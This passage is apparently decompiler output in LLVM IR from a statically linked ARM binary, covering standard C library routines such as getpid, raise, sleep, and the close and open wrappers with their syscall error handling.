  br i1 %v9_13f5c, label %dec_label_pc_13f64, label %dec_label_pc_13f7c

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f64
  %v0_13f78 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f7c

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13f4c, %dec_label_pc_13f64.dec_label_pc_13f58_crit_edge, %dec_label_pc_13f78
  %v0_13f7c = phi i32 [ %v0_13f78, %dec_label_pc_13f78 ], [ %v2_13f5818, %dec_label_pc_13f4c ], [ %v2_13f58, %dec_label_pc_13f64.dec_label_pc_13f58_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f7c = icmp eq i32 %v0_13f7c, 0
  %v0_13fa0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_13f7c, label %dec_label_pc_13f9c, label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f7c
  store i32 %v0_13fa0.pre, i32* %r0.global-to-local, align 4
  %v0_13f88 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f88 = add i32 %v0_13f88, 126
  store i32 %v1_13f88, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f9c

dec_label_pc_13f9c:                               ; preds = %dec_label_pc_13f7c, %dec_label_pc_13f84
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13fa0.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13fa828 = inttoptr i32 %v0_13fa0.pre to i32*
  %v2_13fa829 = load i32, i32* %v1_13fa828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13fac36 = icmp eq i32 %v2_13fa829, 0
  br i1 %v9_13fac36, label %dec_label_pc_13fb4, label %dec_label_pc_13fcc

dec_label_pc_13fb4:                               ; preds = %dec_label_pc_13f9c, %dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge
  %v0_13fb437 = phi i32 [ %v1_13fac.pre, %dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge ], [ 0, %dec_label_pc_13f9c ]
  store i32 %v0_13fb437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13fc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13fc4, label %dec_label_pc_13fc8, label %dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge

dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge:  ; preds = %dec_label_pc_13fb4
  %v0_13fa8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13fac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13fa8 = inttoptr i32 %v0_13fa8.pre to i32*
  %v2_13fa8 = load i32, i32* %v1_13fa8, align 4
  %v3_13fac = icmp uge i32 %v2_13fa8, %v1_13fac.pre
  store i1 %v3_13fac, i1* %cpsr_c.global-to-local, align 1
  %v9_13fac = icmp eq i32 %v2_13fa8, %v1_13fac.pre
  br i1 %v9_13fac, label %dec_label_pc_13fb4, label %dec_label_pc_13fcc

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13fb4
  %v0_13fc8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13fcc

dec_label_pc_13fcc:                               ; preds = %dec_label_pc_13f9c, %dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge, %dec_label_pc_13fc8
  %v0_13fcc = phi i32 [ %v0_13fc8, %dec_label_pc_13fc8 ], [ %v2_13fa829, %dec_label_pc_13f9c ], [ %v2_13fa8, %dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge ]
  %v1_13fcc = phi i32 [ %v0_13fc8, %dec_label_pc_13fc8 ], [ 0, %dec_label_pc_13f9c ], [ %v1_13fac.pre, %dec_label_pc_13fb4.dec_label_pc_13fa8_crit_edge ]
  %v3_13fcc = icmp uge i32 %v0_13fcc, %v1_13fcc
  store i1 %v3_13fcc, i1* %cpsr_c.global-to-local, align 1
  %v9_13fcc = icmp eq i32 %v0_13fcc, %v1_13fcc
  br i1 %v9_13fcc, label %dec_label_pc_13fd4, label %dec_label_pc_13fcc.dec_label_pc_13f4c_crit_edge

dec_label_pc_13fcc.dec_label_pc_13f4c_crit_edge:  ; preds = %dec_label_pc_13fcc
  %v0_13f50.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f4c

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fcc
  %v2_13fd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13fd4, i32* %r4.global-to-local, align 4
  %v1_13fd8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13fd8

; uselistorder directives
  uselistorder i32 %v0_13fc8, { 1, 0 }
  uselistorder i32 %v1_13fac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13f5c.pre, { 2, 1, 0 }
  uselistorder i32 %v2_13f5818, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fb4, { 1, 0 }
  uselistorder label %dec_label_pc_13f9c, { 1, 0 }
  uselistorder label %dec_label_pc_13f7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13f64, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fdc = load i32, i32* @r7, align 4
  store i32 %v3_13fdc, i32* %stack_var_-8, align 4
  %v0_13fe0 = call i32 @__aeabi_read_tp()
  store i32 %v0_13fe0, i32* %r0.global-to-local, align 4
  %v1_13fe4 = add i32 %v0_13fe0, -1060
  %v2_13fe4 = inttoptr i32 %v1_13fe4 to i32*
  %v3_13fe4 = load i32, i32* %v2_13fe4, align 4
  %tmp7 = icmp slt i32 %v3_13fe4, 1
  br i1 %tmp7, label %dec_label_pc_13ff4, label %dec_label_pc_14018

dec_label_pc_13ff4:                               ; preds = %entry
  %v2_13fe8 = icmp eq i32 %v3_13fe4, 0
  br i1 %v2_13fe8, label %dec_label_pc_13ff8, label %dec_label_pc_14004

dec_label_pc_13ff8:                               ; preds = %dec_label_pc_13ff4
  %v1_13ff8 = add i32 %v0_13fe0, -1064
  %v2_13ff8 = inttoptr i32 %v1_13ff8 to i32*
  %v3_13ff8 = load i32, i32* %v2_13ff8, align 4
  store i32 %v3_13ff8, i32* %r0.global-to-local, align 4
  %v2_13ffc = icmp eq i32 %v3_13ff8, 0
  br i1 %v2_13ffc, label %bb, label %bb8

dec_label_pc_14004:                               ; preds = %dec_label_pc_13ff4
  br label %bb8

bb:                                               ; preds = %dec_label_pc_13ff8
  store i32 0, i32* %v2_13ff8, align 4
  %v0_14014.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_14004, %dec_label_pc_13ff8, %bb
  %v0_14014 = phi i32 [ %v3_13ff8, %dec_label_pc_13ff8 ], [ %v0_13fe0, %dec_label_pc_14004 ], [ %v0_14014.pre, %bb ]
  br label %dec_label_pc_14018

dec_label_pc_14018:                               ; preds = %entry, %bb8
  %v0_14018 = phi i32 [ %v3_13fe4, %entry ], [ %v0_14014, %bb8 ]
  store i32 %v0_14018, i32* %r0.global-to-local, align 4
  %v2_1401c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1401c, i32* @r7, align 4
  ret i32 %v0_14018

; uselistorder directives
  uselistorder i32 %v0_14018, { 1, 0 }
  uselistorder i32 %v3_13fe4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14018, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14024 = load i32, i32* @r4, align 4
  store i32 %v3_14024, i32* %stack_var_-20, align 4
  %v0_1402c = call i32 @__aeabi_read_tp()
  store i32 %v0_1402c, i32* %r0.global-to-local, align 4
  %v1_14030 = add i32 %v0_1402c, -1064
  %v2_14030 = inttoptr i32 %v1_14030 to i32*
  %v3_14030 = load i32, i32* %v2_14030, align 4
  store i32 %v3_14030, i32* %r4.global-to-local, align 4
  %v2_14034 = icmp eq i32 %v3_14030, 0
  %v1_1403c = add i32 %v0_1402c, -1060
  %v2_1403c = inttoptr i32 %v1_1403c to i32*
  %v3_1403c = load i32, i32* %v2_1403c, align 4
  store i32 %v3_1403c, i32* %r0.global-to-local, align 4
  br i1 %v2_14034, label %dec_label_pc_14044, label %dec_label_pc_14058

dec_label_pc_14044:                               ; preds = %entry
  store i32 %v3_1403c, i32* %r4.global-to-local, align 4
  store i32 %v3_1403c, i32* %v2_14030, align 4
  %v0_14080.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_14058:                               ; preds = %entry
  %v5_1405c = icmp sgt i32 %v3_1403c, 0
  br i1 %v5_1405c, label %bb28, label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_14058
  %tmp = bitcast i32 %v3_1403c to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_14060 = bitcast float %tmp30 to i32
  %v2_14064 = icmp eq i32 %v1_14060, 0
  br i1 %v2_14064, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14060
  store i32 %v3_14030, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_14060
  %v2_1406c = sub i32 0, %v3_1403c
  store i32 %v2_1406c, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_14058, %dec_label_pc_14044, %.thread
  %v0_14084 = phi i32 [ %v3_1403c, %dec_label_pc_14058 ], [ %v0_14080.pre, %dec_label_pc_14044 ], [ %v3_14030, %bb ], [ %v2_1406c, %.thread ]
  store i32 %v0_14084, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_14084, -4095
  br i1 %tmp31, label %dec_label_pc_140a8, label %dec_label_pc_14090

dec_label_pc_14090:                               ; preds = %bb28
  %v0_14094 = call i32 @__aeabi_read_tp()
  %v3_14098 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14098 = sext i16 %v3_14098 to i32
  %v0_1409c = load i32, i32* %r2.global-to-local, align 4
  %v1_1409c = sub i32 0, %v0_1409c
  store i32 %v1_1409c, i32* %r2.global-to-local, align 4
  %v3_140a0 = add i32 %v4_14098, %v0_14094
  %v4_140a0 = inttoptr i32 %v3_140a0 to i32*
  store i32 %v1_1409c, i32* %v4_140a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140a8

dec_label_pc_140a8:                               ; preds = %bb28, %dec_label_pc_14090
  %v0_140ac = phi i32 [ %v0_14084, %bb28 ], [ -1, %dec_label_pc_14090 ]
  %v3_140a8 = icmp eq i32 %v0_140ac, -1
  store i32 %v0_140ac, i32* %r5.global-to-local, align 4
  br i1 %v3_140a8, label %dec_label_pc_140b4, label %dec_label_pc_140fc

dec_label_pc_140b4:                               ; preds = %dec_label_pc_140a8
  %v0_140b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_140b8, i32* %r0.global-to-local, align 4
  %v3_140bc = load i16, i16* @global_var_21a48.352, align 2
  %v4_140bc = sext i16 %v3_140bc to i32
  %v2_140c0 = add i32 %v4_140bc, %v0_140b8
  %v3_140c0 = inttoptr i32 %v2_140c0 to i32*
  %v4_140c0 = load i32, i32* %v3_140c0, align 4
  %v7_140c4 = icmp eq i32 %v4_140c0, 38
  br i1 %v7_140c4, label %dec_label_pc_140d0, label %dec_label_pc_140b4.dec_label_pc_140fc_crit_edge

dec_label_pc_140b4.dec_label_pc_140fc_crit_edge:  ; preds = %dec_label_pc_140b4
  %v0_140fc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140b4
  %v0_140d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_140d0, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_140d0, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_140d0
  %v5_140e8 = sub i32 0, %v0_140d0
  store i32 %v5_140e8, i32* %r2.global-to-local, align 4
  %v7_140ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_140f4.525 to i32), i32 55636) to i32*), align 4
  %v4_140f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_140f0, i32* %r0.global-to-local, align 4
  %v7_140f4 = add i32 %v7_140ec, %v0_140b8
  %v8_140f4 = inttoptr i32 %v7_140f4 to i32*
  store i32 %v5_140e8, i32* %v8_140f4, align 4
  %v0_140f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_140d0, %bb29
  %v0_140f8 = phi i32 [ %v0_140f8.pre, %bb29 ], [ %v0_140d0, %dec_label_pc_140d0 ]
  store i32 %v0_140f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140b4.dec_label_pc_140fc_crit_edge, %dec_label_pc_140a8, %.thread22
  %v0_140fc = phi i32 [ %v0_140fc.pre, %dec_label_pc_140b4.dec_label_pc_140fc_crit_edge ], [ %v0_140ac, %dec_label_pc_140a8 ], [ %v0_140f8, %.thread22 ]
  store i32 %v0_140fc, i32* %r0.global-to-local, align 4
  %v2_14100 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14100, i32* @r4, align 4
  ret i32 %v0_140fc

; uselistorder directives
  uselistorder i32 %v0_140fc, { 1, 0 }
  uselistorder i32 %v0_140d0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14084, { 2, 0, 1 }
  uselistorder i32 %v3_1403c, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_140fc, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_140a8, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14114 = load i32, i32* @r4, align 4
  %v6_14114 = load i32, i32* @r5, align 4
  %v9_14114 = load i32, i32* @r6, align 4
  %v12_14114 = load i32, i32* @r7, align 4
  %v15_14114 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14124 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_14124, label %dec_label_pc_14138, label %dec_label_pc_141ac

dec_label_pc_14138:                               ; preds = %entry
  %v0_14138 = call i32 @__aeabi_read_tp()
  %v1_1413c = add i32 %v0_14138, -1036
  %v2_1413c = inttoptr i32 %v1_1413c to i32*
  %v3_1413c = load i32, i32* %v2_1413c, align 4
  %v1_14140 = and i32 %v3_1413c, -71
  %v2_14144 = icmp ugt i32 %v1_14140, 7
  store i1 %v2_14144, i1* %cpsr_c.global-to-local, align 1
  %v7_14144 = icmp eq i32 %v1_14140, 8
  %v1_14148 = add i32 %v0_14138, -1168
  store i32 %v1_14148, i32* @r5, align 4
  br i1 %v7_14144, label %dec_label_pc_14150, label %dec_label_pc_14224

dec_label_pc_14150:                               ; preds = %dec_label_pc_14138
  %v2_14154 = add i32 %v0_14138, -624
  %v3_14154 = inttoptr i32 %v2_14154 to i32*
  store i32 -1, i32* %v3_14154, align 4
  %v0_14158 = load i32, i32* @r5, align 4
  %v1_14158 = add i32 %v0_14158, 132
  store i32 %v1_14158, i32* @r6, align 4
  br label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14190.dec_label_pc_1415c_crit_edge, %dec_label_pc_14150
  %v0_14160 = phi i32 [ %v0_14160.pre, %dec_label_pc_14190.dec_label_pc_1415c_crit_edge ], [ %v1_14158, %dec_label_pc_14150 ]
  %v0_1415c = phi i32 [ %v0_14198, %dec_label_pc_14190.dec_label_pc_1415c_crit_edge ], [ %v0_14158, %dec_label_pc_14150 ]
  %v1_1415c = add i32 %v0_1415c, 132
  %v2_1415c = inttoptr i32 %v1_1415c to i32*
  %v3_1415c = load i32, i32* %v2_1415c, align 4
  store i32 %v0_14160, i32* %r2.global-to-local, align 4
  store i32 %v3_1415c, i32* @r4, align 4
  %v1_1416c30 = inttoptr i32 %v0_14160 to i32*
  %v2_1416c31 = load i32, i32* %v1_1416c30, align 4
  %v3_1417033 = icmp uge i32 %v2_1416c31, %v3_1415c
  store i1 %v3_1417033, i1* %cpsr_c.global-to-local, align 1
  %v9_1417039 = icmp eq i32 %v2_1416c31, %v3_1415c
  br i1 %v9_1417039, label %dec_label_pc_14178, label %dec_label_pc_14190

dec_label_pc_14178:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_14178.dec_label_pc_1416c_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14188 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14188, label %dec_label_pc_1418c, label %dec_label_pc_14178.dec_label_pc_1416c_crit_edge

dec_label_pc_14178.dec_label_pc_1416c_crit_edge:  ; preds = %dec_label_pc_14178
  %v0_1416c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14170.pre = load i32, i32* @r4, align 4
  %v1_1416c = inttoptr i32 %v0_1416c.pre to i32*
  %v2_1416c = load i32, i32* %v1_1416c, align 4
  %v3_14170 = icmp uge i32 %v2_1416c, %v1_14170.pre
  store i1 %v3_14170, i1* %cpsr_c.global-to-local, align 1
  %v9_14170 = icmp eq i32 %v2_1416c, %v1_14170.pre
  br i1 %v9_14170, label %dec_label_pc_14178, label %dec_label_pc_14190

dec_label_pc_1418c:                               ; preds = %dec_label_pc_14178
  %v0_1418c = load i32, i32* @r4, align 4
  br label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_14178.dec_label_pc_1416c_crit_edge, %dec_label_pc_1418c
  %v0_14190 = phi i32 [ %v0_1418c, %dec_label_pc_1418c ], [ %v2_1416c31, %dec_label_pc_1415c ], [ %v2_1416c, %dec_label_pc_14178.dec_label_pc_1416c_crit_edge ]
  %v1_14190 = phi i32 [ %v0_1418c, %dec_label_pc_1418c ], [ %v3_1415c, %dec_label_pc_1415c ], [ %v1_14170.pre, %dec_label_pc_14178.dec_label_pc_1416c_crit_edge ]
  %v3_14190 = icmp uge i32 %v0_14190, %v1_14190
  store i1 %v3_14190, i1* %cpsr_c.global-to-local, align 1
  %v9_14190 = icmp eq i32 %v0_14190, %v1_14190
  br i1 %v9_14190, label %dec_label_pc_14198, label %dec_label_pc_14190.dec_label_pc_1415c_crit_edge

dec_label_pc_14190.dec_label_pc_1415c_crit_edge:  ; preds = %dec_label_pc_14190
  %v0_14198 = load i32, i32* @r5, align 4
  %v0_14160.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1415c

dec_label_pc_14198:                               ; preds = %dec_label_pc_14190
  %v0_141a0 = load i32, i32* @r7, align 4
  %v2_141a0 = add i32 %v0_141a0, 116
  %v3_141a0 = inttoptr i32 %v2_141a0 to i32*
  %v4_141a0 = load i32, i32* %v3_141a0, align 4
  store i32 82348, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_141a0)
  %v0_141b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_141ac

dec_label_pc_141ac:                               ; preds = %entry, %dec_label_pc_14198
  %v0_141b4 = phi i32 [ 0, %entry ], [ %v0_141b4.pre, %dec_label_pc_14198 ]
  %v2_141b8 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_141b8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_141c4 = call i32 @__libc_sigaction(i32 17, i32 %v0_141b4, i32 %v2_141b8)
  %v3_141c8 = load i32, i32* %stack_var_-60, align 4
  %v2_141cc = icmp ne i32 %v3_141c8, 0
  store i1 %v2_141cc, i1* %cpsr_c.global-to-local, align 1
  %v7_141cc = icmp eq i32 %v3_141c8, 1
  br i1 %v7_141cc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_141ac
  %v3_141d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_141d0, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_141ac, %bb
  call void @__pseudo_cond_branch(i1 %v7_141cc, i32 ptrtoint (i32* @global_var_10e28.529 to i32))
  %v2_141e0 = ptrtoint i32* %stack_var_-32 to i32
  %v2_141e8 = call i32 @__libc_nanosleep(i32 %v2_141e0, i32 %v2_141e0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_141ec = icmp eq i32 %v2_141e8, 0
  br i1 %v2_141ec, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_14200 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_14200, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14210 = load i32, i32* %stack_var_-40, align 4
  %v1_14214 = and i32 %v3_14210, 65536
  store i32 %v1_14214, i32* %r2.global-to-local, align 4
  %v2_14214 = icmp eq i32 %v1_14214, 0
  br i1 %v2_14214, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_1421c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1421c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14214, i32 ptrtoint (i32* @global_var_10e28.529 to i32))
  br label %dec_label_pc_14224

dec_label_pc_14224:                               ; preds = %dec_label_pc_14138, %.thread5
  %v0_14224 = load i32, i32* @r4, align 4
  store i32 %v3_14114, i32* @r4, align 4
  store i32 %v6_14114, i32* @r5, align 4
  store i32 %v9_14114, i32* @r6, align 4
  store i32 %v12_14114, i32* @r7, align 4
  store i32 %v15_14114, i32* @lr, align 4
  ret i32 %v0_14224

; uselistorder directives
  uselistorder i32 %v0_1418c, { 1, 0 }
  uselistorder i32 %v1_14170.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14224, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_141ac, { 1, 0 }
  uselistorder label %dec_label_pc_14190, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
}

define i32 @function_14238(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14238:
  %v0_14238 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14238, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14238
  %v2_14238 = load i32, i32* @r4, align 4
  %v5_14240 = mul i32 %v2_14238, 524288
  %v6_14240 = and i32 %v5_14240, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14238, %bb
  %v7_14240 = phi i32 [ %arg1, %dec_label_pc_14238 ], [ %v6_14240, %bb ]
  ret i32 %v7_14240

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_14254 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14254, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14254 = load i32, i32* @r0, align 4
  ret i32 %v2_14254

bb1:                                              ; preds = %entry
  %v0_14258 = call i32 @__syscall_error()
  ret i32 %v0_14258
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14264 = load i32, i32* @global_var_24bf0.532, align 4
  %v2_14268 = icmp eq i32 %v3_14264, 0
  store i1 %v2_14268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14268, label %dec_label_pc_14270, label %entry.dec_label_pc_1428c_crit_edge

entry.dec_label_pc_1428c_crit_edge:               ; preds = %entry
  %v3_1428c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1428c

dec_label_pc_14270:                               ; preds = %entry
  %v0_14270 = load i32, i32* @r7, align 4
  store i32 %v0_14270, i32* @ip, align 4
  %v0_14280 = load i32, i32* @r0, align 4
  %v2_14280 = icmp ugt i32 %v0_14280, -4097
  %v7_14280 = icmp eq i32 %v0_14280, -4096
  store i1 %v7_14280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14280, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1428c, %bb8, %bb9, %dec_label_pc_14270
  %merge2 = phi i32 [ %v0_14280, %dec_label_pc_14270 ], [ %v0_142b0, %dec_label_pc_1428c ], [ %v0_142c0, %bb8 ], [ %v0_142c0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_14270
  %v0_14288 = call i32 @__syscall_error()
  br label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %entry.dec_label_pc_1428c_crit_edge, %bb7
  %v3_1428c = phi i32 [ %v3_1428c.pre, %entry.dec_label_pc_1428c_crit_edge ], [ %v0_14288, %bb7 ]
  %v9_1428c = load i32, i32* @r7, align 4
  store i32 %v9_1428c, i32* %stack_var_-8, align 4
  %v12_1428c = load i32, i32* @lr, align 4
  %v0_14290 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14290, i32* @ip, align 4
  store i32 %v3_1428c, i32* @r7, align 4
  %v1_142ac = call i32 @__libc_disable_asynccancel(i32 %v0_14290)
  %v0_142b0 = load i32, i32* @r7, align 4
  store i32 %v0_142b0, i32* @r0, align 4
  %v2_142b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142b4, i32* @r7, align 4
  store i32 %v12_1428c, i32* @lr, align 4
  %v2_142b8 = icmp ugt i32 %v0_142b0, -4097
  %v7_142b8 = icmp eq i32 %v0_142b0, -4096
  store i1 %v7_142b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142b8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1428c
  %v0_142c0 = call i32 @__syscall_error()
  %v0_142d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_142d0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v3_142d0 = load i32, i32* @r1, align 4
  %v4_142d0 = inttoptr i32 %v3_142d0 to i32*
  store i32 %v0_142c0, i32* %v4_142d0, align 4
  %v5_142d0 = load i32, i32* @r4, align 4
  %v6_142d0 = load i32, i32* @r1, align 4
  %v7_142d0 = sub i32 %v6_142d0, %v5_142d0
  store i32 %v7_142d0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_142c0, { 2, 1, 0 }
  uselistorder i32 %v0_142b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14280, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1428c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_142e4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_142e4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_142e4 = load i32, i32* @r0, align 4
  ret i32 %v2_142e4

bb1:                                              ; preds = %entry
  %v0_142e8 = call i32 @__syscall_error()
  ret i32 %v0_142e8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_142f4 = load i32, i32* @global_var_24bf0.532, align 4
  %v2_142f8 = icmp eq i32 %v3_142f4, 0
  store i1 %v2_142f8, i1* %cpsr_z.global-to-local, align 1
